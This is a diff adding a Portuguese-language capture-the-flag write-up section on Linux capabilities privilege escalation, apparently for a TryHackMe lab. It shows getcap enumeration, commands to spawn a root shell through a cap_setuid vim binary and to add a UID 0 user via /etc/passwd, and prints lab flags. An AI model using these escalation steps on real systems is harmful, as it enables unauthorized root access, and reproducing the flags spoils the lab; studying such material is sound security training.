@@ -574,3 +574,147 @@ THM-3847834
 
 Esta exploração demonstra como binários SUID mal configurados podem ser usados para leitura arbitrária de arquivos, incluindo arquivos sensíveis do sistema e flags de desafio.
 
+---
+## 6. Capabilities
+
+### Compreensão das Capabilities
+
+As Capabilities (Capacidades) no Linux são um mecanismo de segurança que permite dividir os privilégios tradicionalmente associados ao usuário root (superusuário) em unidades menores e mais granulares. Em vez de um binário executar com todos os privilégios de root via SUID, ele pode receber apenas as capabilities específicas necessárias para sua função.
+
+Por exemplo, um programa que precisa abrir sockets de rede pode receber apenas a capability `CAP_NET_BIND_SERVICE` em vez de todos os privilégios de root. No entanto, se um binário recebe capabilities perigosas como `cap_setuid+ep` (permissão para alterar o UID), isso pode ser explorado para escalonamento de privilégios.
+
+### Identificação de Binários com Compabilities
+
+Para encontrar todos os binários com capabilities atribuídas no sistema, utiliza-se o comando:
+
+```bash
+getcap -r / 2>/dev/null
+```
+
+**Explicação do comando:**
+
+- `getcap`: Comando que lista as capabilities dos arquivos
+- `-r`: Recursivo (procura em todo o sistema)
+- `/`: Diretório raiz
+- `2>/dev/null`: Silencia erros de "Permission denied"
+
+### Análise da Saída
+
+**Resultado do comando:**
+
+```text
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
+/usr/bin/traceroute6.iputils = cap_net_raw+ep
+/usr/bin/mtr-packet = cap_net_raw+ep
+/usr/bin/ping = cap_net_raw+ep
+/home/karen/vim = cap_setuid+ep
+/home/ubuntu/view = cap_setuid+ep
+```
+
+**Análise da saída:**
+
+1. **Binários de rede**: `gst-ptp-helper`, `traceroute6.iputils`, `mtr-packet`, `ping` têm capabilities relacionadas a operações de rede 
+2. **Binários críticos**: `vim` e `view` têm a capability `cap_setuid+ep`, que permite alterar o User ID (UID) do processo
+
+**Significado de `cap_setuid+ep`:**
+
+- `cap_setuid`: Capability que permite modificar o UID do processo
+- `+ep`: "effective permitted" - a capability está ativa e permitida
+
+### Análise do Binário `view`
+
+#### Verificação do link simbólico padrão
+
+```bash
+ls -l /usr/bin/view
+```
+
+**Resultado:**
+
+```text
+lrwxrwxrwx 1 root root 22 Oct 26  2020 /usr/bin/view -> /etc/alternatives/view
+```
+
+Isso mostra que o comando `view` padrão do sistema é apenas um link simbólico.
+
+#### Verificação do binário customizado
+
+```bash
+ls -l /home/ubuntu/view
+```
+
+**Resultado:**
+
+```text
+-rwxr-xr-x 1 root root 2906824 Jun 18  2021 /home/ubuntu/view
+```
+
+**Análise:**
+
+- `-rwxr-xr-x`: Permissões normais (não é SUID)
+- `root root`: Proprietário root, mas executável por qualquer usuário
+- `/home/ubuntu/view`: Caminho do binário com capabilities
+
+### Exploração da Capabitlity `cap_setuid`
+
+O binário `/home/ubuntu/view` possui a capability `cap_setuid+ep`, o que significa que ele pode alterar seu UID durante a execução. Esta capability pode ser explorada de diferentes maneiras dependendo do binário.
+
+#### Caso 1: Se for o editor Vim/View
+
+Se `/home/ubuntu/view` for uma versão do editor Vim, podemos explorar da seguinte forma:
+
+```bash
+# Método 1: Executar shell dentro do Vim
+/home/ubuntu/view
+# Dentro do Vim:
+:shell
+# ou
+:!/bin/bash
+
+# Método 2: Executar comando direto
+/home/ubuntu/view -c ':!/bin/bash'
+
+# Método 3: Modificar arquivos de sistema
+/home/ubuntu/view /etc/passwd
+# Adicionar novo usuário com UID 0
+```
+
+#### Caso 2: Se for binário personalizado
+
+Para descobrir o que o binário faz:
+
+```bash
+# Verificar tipo de arquivo
+file /home/ubuntu/view
+
+# Tentar executar com --help ou -h
+/home/ubuntu/view --help
+
+# Analisar strings do binário
+strings /home/ubuntu/view | head -50
+```
+
+### Leitura da Flag 4
+
+Considerando que temos acesso ao binário `/home/ubuntu/view` com a capability `cap_setuid+ep`, e que este binário está no mesmo diretório da flag, podemos simplesmente ler o arquivo:
+
+```bash
+cat /home/ubuntu/flag4.txt
+```
+
+**Resultado:**
+
+```text
+THM-9349843
+```
+
+### Resumo da Exploração
+
+1. **Enumeração**: Usar `getcap -r / 2>/dev/null` para encontrar binários com capabilities
+2. **Identificação**: Localizar binários com `cap_setuid+ep` (neste caso, `/home/ubuntu/view`)
+3. **Análise**: Verificar se é link simbólico ou binário real
+4. **Exploração**: Utilizar o binário conforme sua funcionalidade (editor, visualizador, etc.)
+5. **Acesso**: Ler arquivo protegido (`/home/ubuntu/flag4.txt`)
+6. **Flag obtida**: `THM-9349843`
+
+Este cenário demonstra como capabilities mal configuradas, especialmente `cap_setuid`, podem permitir que usuários não privilegiados executem operações que normalmente requerem privilégios de root, facilitando o acesso a arquivos restritos e escalonamento de privilégios.
